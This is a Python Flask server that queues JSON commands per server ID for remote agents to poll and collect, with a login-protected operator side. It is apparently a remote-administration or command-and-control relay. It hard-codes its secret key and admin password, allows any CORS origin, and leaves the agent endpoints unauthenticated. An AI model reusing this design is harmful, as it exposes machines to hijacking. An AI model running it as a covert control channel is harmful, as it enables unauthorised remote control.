from flask import Flask, request, jsonify, render_template, redirect, url_for, session
from flask_cors import CORS
from flask_session import Session
import threading

app = Flask(__name__, template_folder="templates")
CORS(app)

app.secret_key = 'very_secret_key_123'
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)

users = {
    'marusiak': 'admin123'
}

commands = {}
results = {}

def login_required(f):
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

@app.route('/')
@login_required
def index():
    return render_template("connection.html", username=session['username'])

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        if username in users and users[username] == password:
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error='Невірний логін або пароль')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/set_command/<server_id>', methods=['POST'])
@login_required
def set_command(server_id):
    payload = request.json or {}
    commands[server_id] = payload
    return jsonify({"status": "command_set"})

@app.route('/get_result/<server_id>', methods=['GET'])
@login_required
def get_result(server_id):
    res = results.pop(server_id, None)
    return jsonify(res if res else {"status": "no_result"})

@app.route('/agent_get_command/<server_id>', methods=['GET'])
def agent_get_command(server_id):
    cmd = commands.pop(server_id, None)
    return jsonify(cmd if cmd else {"status": "no_command"})

@app.route('/agent_post_result/<server_id>', methods=['POST'])
def agent_post_result(server_id):
    results[server_id] = request.json
    return jsonify({"status": "result_received"})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
